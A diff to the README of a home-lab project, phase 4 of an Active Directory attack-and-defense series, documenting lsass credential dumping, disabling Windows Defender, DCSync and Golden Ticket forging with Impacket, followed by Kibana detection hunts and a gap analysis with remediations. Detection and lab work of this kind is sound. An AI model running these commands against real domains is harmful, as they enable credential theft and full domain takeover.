@@ -17,9 +17,9 @@
 
 ---
 
-## 📌 Lab Series Overview
+## Lab Series Overview
 
-> This repository is **Phase 4** of a five-phase Active Directory attack and defense home lab built from scratch. Each phase builds progressively to the last — from visibility infrastructure to credential access, enumeration, lateral movement, and finally domain-level persistence. The goal is not just to simulate attacks, but to understand exactly what defenders can and cannot see.
+> This repository is **Phase 4** of a five-phase Active Directory attack and defense home lab built from scratch. Each phase builds progressively to the last, from visibility infrastructure to credential access, enumeration, lateral movement, and finally domain-level persistence. The goal is not just to simulate attacks, but to understand exactly what defenders can and cannot see.
 
 | Phase | Title | Focus |
 |-------|-------|-------|
@@ -32,45 +32,45 @@
 
 ---
 
-## 1. 🏗️ WHAT DID I BUILD?
+## 1. WHAT DID I BUILD?
 
-In this Phase (Phase 4), I built the final and most dangerous layer of my AD attack simulation — a complete **domain persistence chain** that began with a compromised workstation and ended with forging valid Kerberos authentication tickets using only a cryptographic hash — no passwords, no accounts, no limits.
+In this Phase (Phase 4), I built the final and most dangerous layer of my AD attack simulation, a complete **domain persistence chain** that began with a compromised workstation and ended with forging valid Kerberos authentication tickets using only a cryptographic hash, no passwords, no accounts, no limits.
 
 Specifically, I built and documented:
 
-- A **DCSync attack pipeline** — abusing Active Directory replication rights to extract the `krbtgt` account's NTLM hash and AES256/AES128 keys from the Domain Controller without ever touching disk or logging into the DC interactively
-- A **Golden Ticket forge workflow** — using the extracted `krbtgt` AES256 key to mint a completely valid Kerberos TGT entirely offline, then using that ticket to authenticate to the DC and access all 13 domain shares with zero knowledge of any real password
-- A **detection hunt in Kibana** — querying for evidence of both attacks across all log sources and mapping exactly what survived, what didn't, and why
-- A **documented detection gap analysis** — proving that a well-configured Sysmon + Winlogbeat + ELK pipeline cannot reliably detect either DCSync or Golden Ticket without additional tooling
+- A **DCSync attack pipeline**, abusing Active Directory replication rights to extract the `krbtgt` account's NTLM hash and AES256/AES128 keys from the Domain Controller without ever touching disk or logging into the DC interactively
+- A **Golden Ticket forge workflow**, using the extracted `krbtgt` AES256 key to mint a completely valid Kerberos TGT entirely offline, then using that ticket to authenticate to the DC and access all 13 domain shares with zero knowledge of any real password
+- A **detection hunt in Kibana**, querying for evidence of both attacks across all log sources and mapping exactly what survived, what didn't, and why
+- A **documented detection gap analysis**, proving that a well-configured Sysmon + Winlogbeat + ELK pipeline cannot reliably detect either DCSync or Golden Ticket without additional tooling
 
-This phase answers the hardest question in the entire lab series: *"If the worst happens — what would I actually see?"*
+This phase answers the hardest question in the entire lab series: *"If the worst happens, what would I actually see?"*
 
 ---
 
-## 2. 🎯 WHY DID I BUILD IT?
+## 2. WHY DID I BUILD IT?
 
-Every previous phase built toward this moment. Credentials were captured in Phase 1. The attack path was mapped in Phase 2. Lateral movement and SYSTEM execution were proven in Phase 3. Phase 4 is where those capabilities converge into something qualitatively different — **domain ownership**.
+Every previous phase built toward this moment. Credentials were captured in Phase 1. The attack path was mapped in Phase 2. Lateral movement and SYSTEM execution were proven in Phase 3. Phase 4 is where those capabilities converge into something qualitatively different, **domain ownership**.
 
 I built this phase for three specific reasons:
 
-**To understand what "fully compromised" actually means.** Domain Admins get discussed constantly in security. But the real crown jewel isn't a DA account — it's the `krbtgt` hash. Owning `krbtgt` means you can impersonate any identity in the domain, indefinitely, without touching a single account's password. I needed to experience that, not just read about it.
+**To understand what "fully compromised" actually means.** Domain Admins get discussed constantly in security. But the real crown jewel isn't a DA account, it's the `krbtgt` hash. Owning `krbtgt` means you can impersonate any identity in the domain, indefinitely, without touching a single account's password. I needed to experience that, not just read about it.
 
-**To test my detection stack under its hardest conditions.** My ELK pipeline performed well in Phases 1–3. DCSync and Golden Ticket were specifically chosen because they are known to be difficult for host-based SIEMs to catch. I wanted to know exactly where my visibility ends — not guess.
+**To test my detection stack under its hardest conditions.** My ELK pipeline performed well in Phases 1–3. DCSync and Golden Ticket were specifically chosen because they are known to be difficult for host-based SIEMs to catch. I wanted to know exactly where my visibility ends, not guess.
 
 **To document the gap honestly.** A lab that only shows you the attacks you can detect is not useful preparation for a real environment. The detection gaps I found in this phase are the most important findings in the entire project.
 
 ---
 
-## 3. 🛠️ WHAT TECHNOLOGIES?
+## 3. WHAT TECHNOLOGIES?
 
 ### Attack Stack
 
 | Tool | Purpose | Phase Used |
 |------|---------|------------|
-| **Impacket — secretsdump** | DCSync via Pass-the-Hash | DCSync |
-| **Impacket — ticketer** | Golden Ticket forge (offline) | Golden Ticket |
-| **Impacket — smbclient** | Authenticate to DC using forged ticket | Ticket use |
-| **Impacket — lookupsid** | Enumerate domain SID via RPC | Pre-requisite |
+| **Impacket: secretsdump** | DCSync via Pass-the-Hash | DCSync |
+| **Impacket: ticketer** | Golden Ticket forge (offline) | Golden Ticket |
+| **Impacket: smbclient** | Authenticate to DC using forged ticket | Ticket use |
+| **Impacket: lookupsid** | Enumerate domain SID via RPC | Pre-requisite |
 | **NetExec (nxc)** | SMB auth, lsass dump via lsassy module | Credential harvest |
 | **lsassy** | In-memory lsass credential extraction | NTLM hash harvest |
 | **Kali Linux** | Attacker platform | All |
@@ -83,26 +83,26 @@ I built this phase for three specific reasons:
 | **Winlogbeat 8.12** | Windows Security event shipping |
 | **Sysmon (SwiftOnSecurity config)** | Process, network, and access telemetry |
 | **Kibana Discover** | KQL-based threat hunting |
-| **Windows Defender** | EDR — actively blocked initial lsass dump attempts |
+| **Windows Defender** | EDR: actively blocked initial lsass dump attempts |
 
 ### Lab Infrastructure
 
 | Component | Spec |
 |-----------|------|
-| Domain Controller | Windows Server 2022 — joshua.local |
-| Victim Workstation | Windows 10 — MY-LAB-PC |
+| Domain Controller | Windows Server 2022: joshua.local |
+| Victim Workstation | Windows 10: MY-LAB-PC |
 | Attacker | Kali Linux 2026 |
-| SIEM | Ubuntu 24.04 — ELK Stack via Docker Compose |
-| Network | VMware — VMnet2 (192.168.18.0/24) |
+| SIEM | Ubuntu 24.04: ELK Stack via Docker Compose |
+| Network | VMware: VMnet2 (192.168.18.0/24) |
 
 ---
 
-## 4. ⚙️ HOW DID I BUILD IT?
+## 4. HOW DID I BUILD IT?
 
-### Phase 4 Attack Chain — Step by Step
+### Phase 4 Attack Chain: Step by Step
 
 ```
-j.jenkins (local admin via GPO misconfiguration — Phase 3)
+j.jenkins (local admin via GPO misconfiguration - Phase 3)
     → Pwn3d! on MY-LAB-PC via NetExec SMB
         → Joshua\Administrator active session found in lsass
             → Defender blocked lsassy and handlekatz
@@ -111,12 +111,12 @@ j.jenkins (local admin via GPO misconfiguration — Phase 3)
                         → DCSync via Pass-the-Hash
                             → krbtgt NTLM + AES256 keys extracted
                                 → Golden Ticket forged (offline)
-                                    → Full DC access — zero passwords used
+                                    → Full DC access - zero passwords used
 ```
 
 ---
 
-### Step 1 — Confirming Access & Finding the Target Session
+### Step 1: Confirming Access & Finding the Target Session
 
 Before any credential extraction, I needed to confirm two things:
 that j.jenkins still had Pwn3d! access, and that a Domain Admin
@@ -132,18 +132,18 @@ netexec smb 192.168.18.142 -u j.jenkins -p '<redacted>' --loggedon-users
 
 **Result:** `Pwn3d!` confirmed. `Joshua\Administrator` shown as active
 session (logon_server: JOSHUA-SERVER2022). The DA had an active
-session on a workstation — a critical real-world misconfiguration.
+session on a workstation, a critical real-world misconfiguration.
 
 > **Network troubleshooting note:** MY-LAB-PC's network profile had
 > reverted to `Public` after a reboot, blocking all SMB-In traffic
 > despite the Domain profile firewall rules being correct. Fixed by
 > setting `NetworkCategory` to `Private` via PowerShell. This is a
-> documented real-world gap — firewall rules mean nothing if the
+> documented real-world gap, firewall rules mean nothing if the
 > wrong profile is active.
 
 ---
 
-### Step 2 — Bypassing Defender & Dumping NTLM from lsass
+### Step 2: Bypassing Defender & Dumping NTLM from lsass
 
 Three tools attempted against active Defender:
 
@@ -151,14 +151,14 @@ Three tools attempted against active Defender:
 |------|--------|--------|
 | lsassy | ❌ Blocked at dump | Defender killed the process |
 | nanodump | ❌ Architecture mismatch | Wrong binary for this OS build |
-| handlekatz | ⚠️ Partial — blocked mid-dump | Defender terminated after copy |
+| handlekatz | ⚠ Partial: blocked mid-dump | Defender terminated after copy |
 
 **Defender disabled (local admin privilege required):**
 ```powershell
 Set-MpPreference -DisableRealtimeMonitoring $true
 ```
 
-**lsassy re-run — success:**
+**lsassy re-run, success:**
 ```bash
 netexec smb 192.168.18.142 -u j.jenkins -p '<redacted>' -M lsassy
 ```
@@ -169,15 +169,15 @@ LSASSY   Saved 5 Kerberos ticket(s) to /home/kaliadmin/.nxc/modules/lsassy
 LSASSY   Joshua\Administrator  203076xxxxxxxxxxxxxxxxxxx
 ```
 
-> **Key finding:** EDR (Windows Defender) is the primary — and in this
-> case only reliable — control against lsass dumping. Local admin
+> **Key finding:** EDR (Windows Defender) is the primary, and in this
+> case only reliable, control against lsass dumping. Local admin
 > privileges + EDR bypass are both required. The SIEM saw nothing.
 
 ---
 
-### Step 3 — DCSync via Pass-the-Hash
+### Step 3: DCSync via Pass-the-Hash
 
-With the Administrator NTLM hash, I performed a DCSync attack —
+With the Administrator NTLM hash, I performed a DCSync attack,
 no plaintext password, no interactive logon to the DC required.
 
 ```bash
@@ -212,9 +212,9 @@ impacket-lookupsid \
 
 ---
 
-### Step 4 — Golden Ticket — Three Attempts, Three Lessons
+### Step 4: Golden Ticket: Three Attempts, Three Lessons
 
-#### Attempt 1 — Fake account (fake_admin) ❌
+#### Attempt 1: Fake account (fake_admin) ❌
 ```bash
 impacket-ticketer \
   -nthash 24895<redacted> \
@@ -223,25 +223,25 @@ impacket-ticketer \
 ```
 **Error:** `KDC_ERR_TGT_REVOKED`
 
-**Root cause:** CVE-2021-42287 (November 2021 patch) — Windows
+**Root cause:** CVE-2021-42287 (November 2021 patch), Windows
 Server 2022 validates PAC account existence against AD. A
 non-existent account is rejected immediately. Pre-2021 DCs:
 this works perfectly. Most public tutorials still show this flow.
 
 ---
 
-#### Attempt 2 — RC4 encryption (NTLM hash only) ❌
+#### Attempt 2: RC4 encryption (NTLM hash only) ❌
 Same command using `-nthash` against a real account.
 
 **Error:** `KDC_ERR_TGT_REVOKED`
 
-**Root cause:** Domain enforces AES-only Kerberos policy —
+**Root cause:** Domain enforces AES-only Kerberos policy,
 the same finding from the Kerberoasting phase. RC4 tickets
 are rejected regardless of account validity.
 
 ---
 
-#### Attempt 3 — AES256 key + real account ✅
+#### Attempt 3: AES256 key + real account ✅
 ```bash
 impacket-ticketer \
   -aesKey b7e5dxxxxxxxxxxxxxxxxxxx \
@@ -261,13 +261,13 @@ impacket-ticketer \
 
 ---
 
-### Step 5 — Using the Golden Ticket
+### Step 5: Using the Golden Ticket
 
 ```bash
 # Load forged ticket into Kerberos environment
 export KRB5CCNAME=/home/kaliadmin/Desktop/Administrator.ccache
 
-# Authenticate to DC — zero passwords
+# Authenticate to DC - zero passwords
 impacket-smbclient \
   -k -no-pass \
   -dc-ip 192.168.18.50 \
@@ -287,41 +287,41 @@ the initial j.jenkins credential from Phase 1.
 
 ---
 
-### Step 6 — Hunting in Kibana
+### Step 6: Hunting in Kibana
 
 Three queries run against the full log dataset:
 
-**Query 1 — DCSync (4662 with replication GUIDs):**
+**Query 1, DCSync (4662 with replication GUIDs):**
 ```kql
 event.code: "4662"
 AND winlog.event_data.Properties: *1131f6aa-9c07-11d1-f79f-00c04fc2dcd2*
 ```
-**Result: 0 hits** — DS Access auditing not configured. Silent.
+**Result: 0 hits.** DS Access auditing not configured. Silent.
 
-**Query 2 — Golden Ticket TGS request (4769):**
+**Query 2, Golden Ticket TGS request (4769):**
 ```kql
 event.code: "4769"
 AND winlog.event_data.TargetUserName: "Administrator"
 ```
-**Result: 0 hits** — Winlogbeat pipeline gap during attack window.
+**Result: 0 hits.** Winlogbeat pipeline gap during attack window.
 Events existed in Windows Event Log but were never shipped.
 
-**Query 3 — Resulting logon from Kali (4624):**
+**Query 3, Resulting logon from Kali (4624):**
 ```kql
 event.code: "4624"
 AND winlog.event_data.LogonType: "3"
 AND source.ip: "192.168.18.70"
 ```
-**Result: 1 hit** — A single, completely normal-looking
+**Result: 1 hit.** A single, completely normal-looking
 Type 3 Kerberos network logon. No red flags. No anomaly score.
 Forensically indistinguishable from a legitimate admin logon.
 
 ---
 
-## 5. 🔐 WHAT SECURITY CONCEPTS?
+## 5. WHAT SECURITY CONCEPTS?
 
 ### DCSync (MITRE T1003.006)
-Any account holding `DS-Replication-Get-Changes-All` rights —
+Any account holding `DS-Replication-Get-Changes-All` rights,
 which Domain Admins have by default, can request AD to replicate
 directory object secrets as if it were another DC. This means
 extracting any account's password hash, including `krbtgt`, without
@@ -337,12 +337,12 @@ by every DC in the domain. It cannot be invalidated by changing
 user passwords. The only remediation is rotating `krbtgt` twice.
 
 ### Pass-the-Hash (MITRE T1550.002)
-NTLM authentication accepts the password hash directly —
+NTLM authentication accepts the password hash directly,
 no plaintext password required. An extracted NTLM hash can be
 presented as a credential to any service that accepts NTLM auth,
 making cracking irrelevant for many attack scenarios.
 
-### CVE-2021-42287 — PAC Validation (November 2021 Patch)
+### CVE-2021-42287: PAC Validation (November 2021 Patch)
 Microsoft's patch to reduce Golden Ticket impact forces the KDC
 to verify that the account name in the PAC (Privilege Attribute
 Certificate) actually exists in Active Directory. This breaks the
@@ -352,10 +352,10 @@ patched Server 2019/2022. Unpatched DCs remain fully vulnerable.
 ### Kerberos Encryption Type Enforcement
 Domains configured for AES-only Kerberos will reject RC4-encrypted
 tickets (`etype 23`). This is a hardening measure that forces
-attackers to obtain the AES key rather than just the NTLM hash —
+attackers to obtain the AES key rather than just the NTLM hash,
 a meaningful uplift in attack difficulty.
 
-### The Detection Gap — Why Host-Based Logging Falls Short
+### The Detection Gap: Why Host-Based Logging Falls Short
 
 ```
 Attack Stage          | Logged? | Why
@@ -368,7 +368,7 @@ Resulting Logon (4624)| ✅ One  | Normal-looking Kerberos logon only
 ──────────────────────────────────────────────────────────
 ```
 
-The entire attack left **one artifact** — a normal Kerberos
+The entire attack left **one artifact**, a normal Kerberos
 network logon indistinguishable from legitimate admin activity.
 Detection of this attack class requires:
 - Microsoft Defender for Identity (MDI)
@@ -377,7 +377,7 @@ Detection of this attack class requires:
 
 ---
 
-## 6. 📚 WHAT DID I LEARN?
+## 6. WHAT DID I LEARN?
 
 ### Technical Learnings
 
@@ -397,7 +397,7 @@ environments. The real-world gap between "I read about this" and
 
 **EDR changes everything about credential dumping.**
 With Defender active, three separate lsass dump tools failed.
-The attack only succeeded after Defender was manually disabled —
+The attack only succeeded after Defender was manually disabled,
 which itself required local admin rights that came from a separate
 misconfiguration. The dependency chain matters.
 
@@ -410,7 +410,7 @@ The configuration was not.
 **A Winlogbeat registry gap erased the evidence window.**
 When Winlogbeat's internal registry file was in a corrupted state,
 it shipped no events. The 4769 events from the Golden Ticket use
-existed in the Windows Security log — but by the time Winlogbeat
+existed in the Windows Security log, but by the time Winlogbeat
 was fixed, the log had rolled over. Retention and pipeline health
 are detection dependencies, not just operational ones.
 
@@ -420,20 +420,20 @@ are detection dependencies, not just operational ones.
   is what made this entire chain possible.
 - Enabling DS Access auditing costs nothing and catches the most
   dangerous attack in this entire lab. It was not enabled.
-- Rotating `krbtgt` is the only way to invalidate Golden Tickets —
+- Rotating `krbtgt` is the only way to invalidate Golden Tickets,
   and it must be done twice, spaced by the maximum ticket lifetime (10 hrs).
 - A single "normal-looking" Kerberos logon is the only survivor of
   a complete domain compromise. Defenders need more than logs to catch this.
 
 ---
 
-## 7. 🔄 WHAT WOULD I IMPROVE?
+## 7. WHAT WOULD I IMPROVE?
 
 ### Detection Improvements
 
 | Gap | Improvement |
 |-----|-------------|
-| DCSync invisible | Enable Directory Service Access auditing — 4662 with replication GUIDs |
+| DCSync invisible | Enable Directory Service Access auditing: 4662 with replication GUIDs |
 | LSASS dump invisible | Add Sysmon EID 10 ProcessAccess rule targeting lsass.exe |
 | Golden Ticket no alert | Build 4769-without-preceding-4768 correlation rule |
 | Defender disabled silently | Alert on `DisableRealtimeMonitoring` registry change (Sysmon EID 13) |
@@ -442,16 +442,16 @@ are detection dependencies, not just operational ones.
 
 ### Infrastructure Improvements
 
-- **Static IPs** — DHCP lease changes caused multiple false-start
+- **Static IPs**: DHCP lease changes caused multiple false-start
   troubleshooting sessions. Static assignments on all lab VMs
   would eliminate an entire class of lab friction.
-- **Winlogbeat health monitoring** — A Kibana alert on "no events
+- **Winlogbeat health monitoring**: A Kibana alert on "no events
   from Joshua-Server2022 in last 15 minutes" would have caught
   the pipeline gap immediately instead of discovering it during a hunt.
-- **krbtgt rotation procedure** — Document and test the two-rotation
+- **krbtgt rotation procedure**: Document and test the two-rotation
   process as a tabletop exercise. Understand the service impact
   before needing to do it under pressure.
-- **Credential Guard** — Enable on all Tier 1/2 systems. Virtualising
+- **Credential Guard**: Enable on all Tier 1/2 systems. Virtualising
   lsass makes the dump technique in this phase impossible outright.
 
 ### Lab Scope Improvements
@@ -466,9 +466,9 @@ are detection dependencies, not just operational ones.
 
 ---
 
-## 8. 📸 WHAT EVIDENCE DO I HAVE?
+## 8. WHAT EVIDENCE DO I HAVE?
 
-### Screenshot 1 — lsassy Extracts Administrator NTLM Hash
+### Screenshot 1: lsassy Extracts Administrator NTLM Hash
 
 > NetExec lsassy module showing successful extraction of
 > `Joshua\Administrator` NTLM hash `203072cc67...` after
@@ -479,7 +479,7 @@ are detection dependencies, not just operational ones.
 
 ---
 
-### Screenshot 2 — DCSync Output: krbtgt Extracted
+### Screenshot 2: DCSync Output: krbtgt Extracted
 
 > `impacket-secretsdump` DCSync result showing krbtgt NTLM hash,
 > AES256 key, AES128 key, and DES key extracted via Pass-the-Hash.
@@ -490,7 +490,7 @@ are detection dependencies, not just operational ones.
 
 ---
 
-### Screenshot 3 — Domain SID via lookupsid
+### Screenshot 3: Domain SID via lookupsid
 
 > `impacket-lookupsid` output showing full domain user and group
 > enumeration including Domain SID `S-1-5-21-1811309030-...`
@@ -500,7 +500,7 @@ are detection dependencies, not just operational ones.
 
 ---
 
-### Screenshot 4 — Golden Ticket Forged (Administrator.ccache)
+### Screenshot 4: Golden Ticket Forged (Administrator.ccache)
 
 > `impacket-ticketer` output showing successful offline ticket
 > construction for `joshua.local/Administrator` signed with
@@ -510,7 +510,7 @@ are detection dependencies, not just operational ones.
 
 ---
 
-### Screenshot 5 — describeTicket Output: Ticket Verified
+### Screenshot 5: describeTicket Output: Ticket Verified
 
 > `impacket-describeTicket` parsing `Administrator.ccache` showing:
 > `User Name: Administrator`, `Service: krbtgt/JOSHUA.LOCAL`,
@@ -521,7 +521,7 @@ are detection dependencies, not just operational ones.
 
 ---
 
-### Screenshot 6 — Full DC Share Access (No Password)
+### Screenshot 6: Full DC Share Access (No Password)
 
 > `impacket-smbclient` authenticated via forged ticket showing
 > all 13 domain shares returned including `C$`, `ADMIN$`,
@@ -533,19 +533,19 @@ are detection dependencies, not just operational ones.
 
 ---
 
-### Screenshot 7 — Kibana: Zero 4662 Events (DCSync Gap)
+### Screenshot 7: Kibana: Zero 4662 Events (DCSync Gap)
 
 > Kibana Discover query `event.code: "4662"` returning zero results
 > across the full 1-hour window covering the DCSync attack.
-> DS Access auditing not configured — confirmed detection gap.
+> DS Access auditing not configured, confirmed detection gap.
 
 <img width="642" height="659" alt="No event hit 4662" src="https://github.com/user-attachments/assets/e9ae43d1-8bf4-40f6-8aaa-d92431de21b3" />
 
 ---
 
-### Screenshot 8 — Kibana: The One Surviving Artifact (4624)
+### Screenshot 8: Kibana: The One Surviving Artifact (4624)
 
-> The single event recovered from the Golden Ticket attack —
+> The single event recovered from the Golden Ticket attack,
 > a Type 3 Kerberos network logon from Kali IP `192.168.18.70`
 > to `Joshua-Server2022`. Fields visible:
 > `AuthenticationPackageName: Kerberos`, `LogonType: 3`,
@@ -555,7 +555,7 @@ are detection dependencies, not just operational ones.
 
 ---
 
-## 🗺️ Attack Flow Diagram
+## Attack Flow Diagram
 
 ```
 ┌─────────────────────────────────────────────────────────────────┐
@@ -577,10 +577,10 @@ are detection dependencies, not just operational ones.
                 ▼
           impacket-secretsdump (Pass-the-Hash)
           DCSync against DC → krbtgt NTLM + AES256 extracted
-          [ZERO LOG EVIDENCE — DS Access audit not configured]
+          [ZERO LOG EVIDENCE - DS Access audit not configured]
                 │
                 ▼
-          impacket-ticketer (offline — no DC contact)
+          impacket-ticketer (offline - no DC contact)
           Golden Ticket forged for Administrator
           AES256 signed, 10hr lifetime, real account name
                 │
@@ -588,7 +588,7 @@ are detection dependencies, not just operational ones.
           KRB5CCNAME=Administrator.ccache
           impacket-smbclient → DC authenticated
           All 13 shares accessible
-          [ONE LOG EVENT — single 4624 Kerberos logon]
+          [ONE LOG EVENT - single 4624 Kerberos logon]
                 │
                 ▼
           ╔═══════════════════════════════╗
@@ -600,7 +600,7 @@ are detection dependencies, not just operational ones.
 
 ---
 
-## 🔗 MITRE ATT&CK Coverage
+## MITRE ATT&CK Coverage
 
 | Technique | ID | Tool Used |
 |-----------|-----|-----------|
@@ -613,7 +613,7 @@ are detection dependencies, not just operational ones.
 
 ---
 
-## 📁 Folder Structure
+## Folder Structure
 
 ```
 Phase-4-DCSync-Golden-Ticket/
@@ -631,7 +631,7 @@ Phase-4-DCSync-Golden-Ticket/
 
 ---
 
-## ⚠️ Legal & Ethical Notice
+## ⚠ Legal & Ethical Notice
 
 > This project was conducted entirely within a private, isolated
 > virtual lab environment built and owned by the author.
@@ -642,7 +642,7 @@ Phase-4-DCSync-Golden-Ticket/
 
 ---
 
-## 🔗 Connect
+## Connect
 
 **Joshua** | SOC Analyst | Security Engineer | Active Directory | SIEM | Detection Engineering
 
